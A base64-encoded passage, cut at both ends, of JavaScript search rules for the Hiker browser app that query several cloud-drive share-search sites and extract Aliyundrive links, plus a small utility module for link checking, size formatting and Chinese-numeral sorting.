ee9keermVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBKU09OLnN0cmluZ2lmeShcXFwiaGlrZXI6Ly9wYWdlL3lzZng/d2ViVXJsPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQodSkpXFxuICAgICAgICAgICAgICAgICAgICAgICAgfV1cXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfSxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXG4gICAgICAgICAgICBpZiAoaW5wdXQuaW5jbHVkZXMoXFxcImFsaXl1bmRyaXZlXFxcIikpIHJldHVybiBpbnB1dDtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoaW5wdXQpO1xcbiAgICAgICAgICAgIHZhciBfbGlua3MgPSBodG1sLm1hdGNoKC9odHRwczpcXFxcL1xcXFwvKHd3d1xcXFwuYWxpeXVuZHJpdmVcXFxcLmNvbVxcXFwvc3xhbHl3cFxcXFwubmV0KVxcXFwvXFxcXHcqL2cpIHx8IFtdO1xcbiAgICAgICAgICAgIGlmIChfbGlua3MubGVuZ3RoID4gMSAmJiBfbGlua3NbMV0ucmVwbGFjZShfbGlua3NbMF0sIFxcXCJcXFwiKS5yZXBsYWNlKC9bYS16QS1aMC05XSsvZywgXFxcIlxcXCIpID09IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBfbGlua3NbMV07XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChfbGlua3MubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gX2xpbmtzWzBdO1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3lzZng/d2ViVXJsPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcbiAgICAgICAgICAgIH1cXG5cXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogJ0NDT0YnLFxcbiAgICAgICAgcGFnZTogdHJ1ZSxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXG4gICAgICAgICAgICBsZXQgZCA9IFtdXFxuICAgICAgICAgICAgbGV0IGFsaVV0aWwgPSAkLnJlcXVpcmUoXFxcImFsaVV0aWxcXFwiKTtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IGZldGNoKCdodHRwczovL3Bhbi5jY29mLmNjL2FwaS9zZWFyY2gnLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJjb250ZW50LXR5cGVcXFwiOiAnYXBwbGljYXRpb24vanNvbicsXFxuICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3Bhbi5jY29mLmNjL3NlYXJjaD9rZXl3b3JkPScgKyBzXFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIGJvZHk6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJwYWdlU2l6ZVxcXCI6IDIwLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInBhZ2VOdW1cXFwiOiBwYWdlLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcImtleXdvcmRcXFwiOiBzLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcImZyb21Nb2JpbGVcXFwiOiB0cnVlXFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IEpTT04ucGFyc2UoaHRtbClcXG4gICAgICAgICAgICAgICAgLmRhdGEucm93c1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBsaXN0W2ldO1xcbiAgICAgICAgICAgICAgICBsZXQgdGl0bGUgPSBpdC5maWxlTmFtZVxcbiAgICAgICAgICAgICAgICBsZXQgbXVybCA9IGl0LnVybFxcbiAgICAgICAgICAgICAgICBsZXQgdHlwZSA9IGl0LnR5cGUucmVwbGFjZSgvZm9sZGVyLywgJ+aWh+S7tuWkuScpLnJlcGxhY2UoL2ZpbGUvLCAn5paH5Lu2JylcXG4gICAgICAgICAgICAgICAgaWYgKHRpdGxlLmluY2x1ZGVzKHMpKSB7XFxuICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiAn5paH5Lu257G75Z6L77yaJyArIHR5cGUgKyAn77yM5paH5Lu25aSn5bCP77yaJyArIGFsaVV0aWwuYnl0ZXNUb1NpemUoaXQuc2l6ZSksXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBtdXJsXFxuICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkXFxuICAgICAgICB9XFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIG5hbWU6ICfpmL/ph4zlsI/nq5knLFxcbiAgICAgICAgcGFnZTogdHJ1ZSxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXG4gICAgICAgICAgICBsZXQgaG9tZSA9IFxcXCJodHRwczovL3BhbjY2Ni5uZXRcXFwiO1xcbiAgICAgICAgICAgIGxldCBkID0gW107XFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KGJ1aWxkVXJsKGhvbWUgKyBcXFwiL2FwaS9kaXNjdXNzaW9uc1xcXCIsIHtcXG4gICAgICAgICAgICAgICAgXFxcImluY2x1ZGVcXFwiOiBcXFwidXNlcixsYXN0UG9zdGVkVXNlcixtb3N0UmVsZXZhbnRQb3N0LG1vc3RSZWxldmFudFBvc3QudXNlcix0YWdzLHRhZ3MucGFyZW50LGZpcnN0UG9zdFxcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJmaWx0ZXJbcV1cXFwiOiBzIC8qICsgXFxcIiB0YWc6dmlkZW8sY29taWNcXFwiKi8gLFxcbiAgICAgICAgICAgICAgICAvL1xcXCJmaWx0ZXJbdGFnXVxcXCI6IFxcXCJ2aWRlbyxjb21pY1xcXCIsXFxuICAgICAgICAgICAgICAgIFxcXCJwYWdlW29mZnNldF1cXFwiOiAyMCAqIChwYWdlIC0gMSlcXG4gICAgICAgICAgICB9KSwge1xcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICAgICBcXFwiY29udGVudC10eXBlXFxcIjogXFxcImFwcGxpY2F0aW9uL2pzb25cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBcXFwiaHR0cHM6Ly9wYW42NjYubmV0Lz9xPVxcXCIgKyBzXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IEpTT04ucGFyc2UoaHRtbCkuZGF0YTtcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxpc3QubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ZW0gPSBsaXN0W2ldLmF0dHJpYnV0ZXM7XFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBob21lICsgXFxcIi9kL1xcXCIgKyBpdGVtLnNsdWc7XFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6ICflj5HluIPml7bpl7TvvJonICsgJC5kYXRlRm9ybWF0KG5ldyBEYXRlKGl0ZW0uY3JlYXRlZEF0KSwgXFxcInl5eXktTU0tZGQgSEg6bW06c3NcXFwiKSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IFt7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi6L+b5YWl5biW5a2QXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAganM6IEpTT04uc3RyaW5naWZ5KFxcXCJoaWtlcjovL3BhZ2UveXNmeD93ZWJVcmw9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudCh1cmwpKVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1dXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZXR1cm4gZDtcXG4gICAgICAgIH0sXFxuICAgICAgICBmaW5kQWxpVXJsKGlucHV0KSB7XFxuICAgICAgICAgICAgbGV0IGh0bWwgPSBwZGZoKHJlcXVlc3QoaW5wdXQpLCBcXFwiVGV4dFxcXCIpO1xcbiAgICAgICAgICAgIGxldCBfbGlua3MgPSBodG1sLm1hdGNoKC9odHRwczpcXFxcL1xcXFwvKHd3d1xcXFwuYWxpeXVuZHJpdmVcXFxcLmNvbVxcXFwvc3xhbHl3cFxcXFwubmV0KVxcXFwvXFxcXHcqL2cpIHx8IFtdO1xcbiAgICAgICAgICAgIGxldCBzaGFyZVB3ZCA9IGh0bWwubWF0Y2goL+aPkOWPlueggVs677yaXVxcXFxzKj8oXFxcXHd7NH0pLyk7XFxuICAgICAgICAgICAgc2hhcmVQd2QgPSBBcnJheS5pc0FycmF5KHNoYXJlUHdkKSAmJiBzaGFyZVB3ZC5sZW5ndGggPiAwID8gc2hhcmVQd2RbMV0gOiBcXFwiXFxcIjtcXG4gICAgICAgICAgICBpZiAoX2xpbmtzLmxlbmd0aCA+IDEgJiYgX2xpbmtzWzFdLnJlcGxhY2UoX2xpbmtzWzBdLCBcXFwiXFxcIikucmVwbGFjZSgvW2EtekEtWjAtOV0rL2csIFxcXCJcXFwiKSA9PSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgICAgICAgICAgYWxpVXJsOiBfbGlua3NbMV0sXFxuICAgICAgICAgICAgICAgICAgICBzaGFyZVB3ZDogc2hhcmVQd2RcXG4gICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKF9saW5rcy5sZW5ndGggPiAwKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgICAgICBhbGlVcmw6IF9saW5rc1swXSxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZFxcbiAgICAgICAgICAgICAgICB9O1xcbiAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL3lzZng/d2ViVXJsPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAge1xcbiAgICAgICAgbmFtZTogJ+S6keebmOWIhuS6q+ekvuWMuicsXFxuICAgICAgICBwYWdlOiB0cnVlLFxcbiAgICAgICAgZmluZDogZnVuY3Rpb24ocywgcGFnZSkge1xcbiAgICAgICAgICAgIGxldCBob21lID0gXFxcImh0dHBzOi8veXVucGFuMS5jY1xcXCI7XFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoYnVpbGRVcmwoaG9tZSArIFxcXCIvYXBpL2Rpc2N1c3Npb25zXFxcIiwge1xcbiAgICAgICAgICAgICAgICBcXFwiaW5jbHVkZVxcXCI6IFxcXCJ1c2VyLGxhc3RQb3N0ZWRVc2VyLG1vc3RSZWxldmFudFBvc3QsbW9zdFJlbGV2YW50UG9zdC51c2VyLHRhZ3MsdGFncy5wYXJlbnQsZmlyc3RQb3N0XFxcIixcXG4gICAgICAgICAgICAgICAgXFxcImZpbHRlcltxXVxcXCI6IHMgLyogKyBcXFwiIHRhZzp2aWRlbyxjb21pY1xcXCIqLyAsXFxuICAgICAgICAgICAgICAgIC8vXFxcImZpbHRlclt0YWddXFxcIjogXFxcInZpZGVvLGNvbWljXFxcIixcXG4gICAgICAgICAgICAgICAgXFxcInBhZ2Vbb2Zmc2V0XVxcXCI6IDIwICogKHBhZ2UgLSAxKVxcbiAgICAgICAgICAgIH0pLCB7XFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJjb250ZW50LXR5cGVcXFwiOiBcXFwiYXBwbGljYXRpb24vanNvblxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiUmVmZXJlclxcXCI6IFxcXCJodHRwczovL3BhbjY2Ni5uZXQvP3E9XFxcIiArIHNcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGxldCBsaXN0ID0gSlNPTi5wYXJzZShodG1sKS5kYXRhO1xcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICBsZXQgaXRlbSA9IGxpc3RbaV0uYXR0cmlidXRlcztcXG4gICAgICAgICAgICAgICAgbGV0IHVybCA9IGhvbWUgKyBcXFwiL2QvXFxcIiArIGl0ZW0uc2x1ZztcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogJ+WPkeW4g+aXtumXtO+8micgKyAkLmRhdGVGb3JtYXQobmV3IERhdGUoaXRlbS5jcmVhdGVkQXQpLCBcXFwieXl5eS1NTS1kZCBISDptbTpzc1xcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1cmwsXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLov5vlhaXluJblrZBcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqczogSlNPTi5zdHJpbmdpZnkoXFxcImhpa2VyOi8vcGFnZS95c2Z4P3dlYlVybD1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHVybCkpXFxuICAgICAgICAgICAgICAgICAgICAgICAgfV1cXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBkO1xcbiAgICAgICAgfSxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHBkZmgocmVxdWVzdChpbnB1dCksIFxcXCJUZXh0XFxcIik7XFxuICAgICAgICAgICAgbGV0IF9saW5rcyA9IGh0bWwubWF0Y2goL2h0dHBzOlxcXFwvXFxcXC8od3d3XFxcXC5hbGl5dW5kcml2ZVxcXFwuY29tXFxcXC9zfGFseXdwXFxcXC5uZXQpXFxcXC9cXFxcdyovZykgfHwgW107XFxuICAgICAgICAgICAgbGV0IHNoYXJlUHdkID0gaHRtbC5tYXRjaCgv5o+Q5Y+W56CBWzrvvJpdXFxcXHMqPyhcXFxcd3s0fSkvKTtcXG4gICAgICAgICAgICBzaGFyZVB3ZCA9IEFycmF5LmlzQXJyYXkoc2hhcmVQd2QpICYmIHNoYXJlUHdkLmxlbmd0aCA+IDAgPyBzaGFyZVB3ZFsxXSA6IFxcXCJcXFwiO1xcbiAgICAgICAgICAgIGlmIChfbGlua3MubGVuZ3RoID4gMSAmJiBfbGlua3NbMV0ucmVwbGFjZShfbGlua3NbMF0sIFxcXCJcXFwiKS5yZXBsYWNlKC9bYS16QS1aMC05XSsvZywgXFxcIlxcXCIpID09IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgICAgICBhbGlVcmw6IF9saW5rc1sxXSxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZFxcbiAgICAgICAgICAgICAgICB9O1xcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoX2xpbmtzLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAgICAgICAgIGFsaVVybDogX2xpbmtzWzBdLFxcbiAgICAgICAgICAgICAgICAgICAgc2hhcmVQd2Q6IHNoYXJlUHdkXFxuICAgICAgICAgICAgICAgIH07XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UveXNmeD93ZWJVcmw9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIC8qLFxcbiAgICAgICAge1xcbiAgICAgICAgICAgIG5hbWU6IFxcXCLlpYflppnmkJzntKJcXFwiLFxcbiAgICAgICAgICAgIHBhZ2U6IHRydWUsXFxuICAgICAgICAgICAgZmluZChzLCBwYWdlKSB7XFxuICAgICAgICAgICAgICAgIGxldCB1cmw7XFxuICAgICAgICAgICAgICAgIGlmIChwYWdlID09PSAxKSB7XFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSBidWlsZFVybChcXFwiaHR0cHM6Ly93d3cubWFnaWNhbHNlYXJjaC50b3AvYXBpL3BzaG91L2dldERhdGFcXFwiLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgd29yZDogcyxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiBcXFwi6Zi/6YeM572R55uYXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSBidWlsZFVybChcXFwiaHR0cHM6Ly93d3cubWFnaWNhbHNlYXJjaC50b3AvYXBpL3BzaG91L2dldE5leHRQYWdlXFxcIiwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcImh0dHBzOi8vYXBpLnVweXVuc28yLmNvbS9zZWFyY2g/c190eXBlPTJAcGFnZT1cXFwiICsgcGFnZSArIFxcXCJAa2V5d29yZD1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHMpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHdlYnNpdGU6IFxcXCLpmL/ph4znvZHnm5hcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBsZXQgcmVzdWx0ID0gcmVxdWVzdCh1cmwsIHtcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBSZWZlcmVyOiBidWlsZFVybChcXFwiaHR0cHM6Ly93d3cubWFnaWNhbHNlYXJjaC50b3Avc2VhcmNoXFxcIiwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3b3JkOiBzLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcGFnZTogMFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICByZXN1bHQgPSBKU09OLnBhcnNlKEpTT04ucGFyc2UocmVzdWx0KSk7XFxuICAgICAgICAgICAgICAgIGxldCBsaXN0ID0gcmVzdWx0LnJlc3VsdC5pdGVtcztcXG4gICAgICAgICAgICAgICAgbGV0IGQgPSBbXTtcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgbGlzdCkge1xcbiAgICAgICAgICAgICAgICAgICAgaWYgKGl0LmlkID09IC0xKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBpdC50aXRsZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBcXFwi5pel5pyf77yaXFxcIiArIGl0Lmluc2VydF90aW1lICsgXFxcIlxcXFxu6Lev5b6E77yaXFxcIiArIGl0LnBhdGgsXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBpdC5wYWdlX3VybFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgcmV0dXJuIGQ7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSovXFxuXTtcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuW3peWFt1wiLFwicGF0aFwiOlwiYWxpVXRpbFwiLFwicnVsZVwiOlwiJC5leHBvcnRzID0ge1xcbiAgICBjaGVja2FsaShyZWFsdXJsKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGlmIChyZWFsdXJsLmluY2x1ZGVzKFxcXCJjb20vcy9cXFwiKSAmJiByZWFsdXJsICE9IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgIGxldCBzaGFyZUlkID0gcmVhbHVybC5zcGxpdChcXFwiP1xcXCIpWzBdLnNwbGl0KFxcXCIvXFxcIilbNF07XFxuICAgICAgICAgICAgICAgIGxldCBzaGFyZSA9IGZldGNoKFxcXCJodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20vYWRyaXZlL3YzL3NoYXJlX2xpbmsvZ2V0X3NoYXJlX2J5X2Fub255bW91c1xcXCIsIHtcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJVc2VyLUFnZW50XFxcIjogUENfVUEsXFxuICAgICAgICAgICAgICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgICAgICBib2R5OiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgXFxcInNoYXJlX2lkXFxcIjogc2hhcmVJZFxcbiAgICAgICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBpZiAoc2hhcmUuaW5jbHVkZXMoXFxcInNoYXJlX2xpbmsgaXNcXFwiKSB8fCBzaGFyZS5pbmNsdWRlcyhcXFwic2hhcmVfbGluayBjYW5ub3RcXFwiKSkgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gY2F0Y2ggKGUpIHt9XFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgfSxcXG4gICAgYnl0ZXNUb1NpemUoc2l6ZSkge1xcbiAgICAgICAgaWYgKCFzaXplKSB7XFxuICAgICAgICAgICAgcmV0dXJuICcwJztcXG4gICAgICAgIH1cXG4gICAgICAgIGNvbnN0IHVuaXRzID0gWydCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJywgJ1BCJywgJ0VCJywgJ1pCJywgJ1lCJ107XFxuICAgICAgICBsZXQgaSA9IDA7XFxuICAgICAgICB3aGlsZSAoc2l6ZSA+PSAxMDI0KSB7XFxuICAgICAgICAgICAgc2l6ZSAvPSAxMDI0O1xcbiAgICAgICAgICAgIGkrKztcXG4gICAgICAgIH1cXG4gICAgICAgIHNpemUgPSBpID8gTnVtYmVyKHNpemUudG9GaXhlZCgyKSkgOiBzaXplO1xcbiAgICAgICAgcmV0dXJuIGAke3NpemV9ICR7dW5pdHNbaV19YDtcXG4gICAgfSxcXG4gICAgZ2V0Q3J5cHRvSlMoKSB7XFxuICAgICAgICBpZiAodHlwZW9mIENyeXB0b0pTID09PSBcXFwidW5kZWZpbmVkXFxcIikge1xcbiAgICAgICAgICAgIGV2YWwoZ2V0Q3J5cHRvSlMoKSk7XFxuICAgICAgICAgICAgcmV0dXJuIENyeXB0b0pTO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIENyeXB0b0pTO1xcbiAgICB9LFxcbiAgICBnZXROYW1lc1NvcnQoKSB7XFxuICAgICAgICBsZXQgY2huTnVtQ2hhciA9IHtcXG4gICAgICAgICAgICDpm7Y6IDAsXFxuICAgICAgICAgICAg5LiAOiAxLFxcbiAgICAgICAgICAgIOS6jDogMixcXG4gICAgICAgICAgICDkuIk6IDMsXFxuICAgICAgICAgICAg5ZubOiA0LFxcbiAgICAgICAgICAgIOS6lDogNSxcXG4gICAgICAgICAgICDlha06IDYsXFxuICAgICAgICAgICAg5LiDOiA3LFxcbiAgICAgICAgICAgIOWFqzogOCxcXG4gICAgICAgICAgICDkuZ06IDlcXG4gICAgICAgIH07XFxuXFxuICAgICAgICBsZXQgY2huTmFtZVZhbHVlID0ge1xcbiAgICAgICAgICAgIOWNgToge1xcbiAgICAgICAgICAgICAgICB2YWx1ZTogMTAsXFxuICAgICAgICAgICAgICAgIHNlY1VuaXQ6IGZhbHNlXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICDnmb46IHtcXG4gICAgICAgICAgICAgICAgdmFsdWU6IDEwMCxcXG4gICAgICAgICAgICAgICAgc2VjVW5pdDogZmFsc2VcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIOWNgzoge1xcbiAgICAgICAgICAgICAgICB2YWx1ZTogMTAwMCxcXG4gICAgICAgICAgICAgICAgc2VjVW5pdDogZmFsc2VcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIOS4hzoge1xcbiAgICAgICAgICAgICAgICB2YWx1ZTogMTAwMDAsXFxuICAgICAgICAgICAgICAgIHNlY1VuaXQ6IHRydWVcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIOS6vzoge1xcbiAgICAgICAgICAgICAgICB2YWx1ZTogMTAwMDAwMDAwLFxcbiAgICAgICAgICAgICAgICBzZWNVbml0OiB0cnVlXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcblxcbiAgICAgICAgZnVuY3Rpb24gQ2hpbmVzZVRvTnVtYmVyKGNoblN0cikge1xcbiAgICAgICAgICAgIGxldCBydG4gPSAwO1xcbiAgICAgICAgICAgIGxldCBzZWN0aW9uID0gMDtcXG4gICAgICAgICAgICBsZXQgbnVtYmVyID0gMDtcXG4gICAgICAgICAgICBsZXQgc2VjVW5pdCA9IGZhbHNlO1xcbiAgICAgICAgICAgIGxldCBzdHIgPSBjaG5TdHIuc3BsaXQoJycpO1xcblxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgIGxldCBudW0gPSBjaG5OdW1DaGFyW3N0cltpXV07XFxuICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgbnVtICE9PSAndW5kZWZpbmVkJykge1xcbiAgICAgICAgICAgICAgICAgICAgbnVtYmVyID0gbnVtO1xcbiAgICAgICAgICAgICAgICAgICAgaWYgKGkgPT09IHN0ci5sZW5ndGggLSAxKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgc2VjdGlvbiArPSBudW1iZXI7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdW5pdCA9IGNobk5hbWVWYWx1ZVtzdHJbaV1dLnZhbHVlO1xcbiAgICAgICAgICAgICAgICAgICAgc2VjVW5pdCA9IGNobk5hbWVWYWx1ZVtzdHJbaV1dLnNlY1VuaXQ7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoc2VjVW5pdCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlY3Rpb24gPSAoc2VjdGlvbiArIG51bWJlcikgKiB1bml0O1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJ0biArPSBzZWN0aW9uO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlY3Rpb24gPSAwO1xcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWN0aW9uICs9IChudW1iZXIgKiB1bml0KTtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgIG51bWJlciA9IDA7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIHJ0biArIHNlY3Rpb247XFxuICAg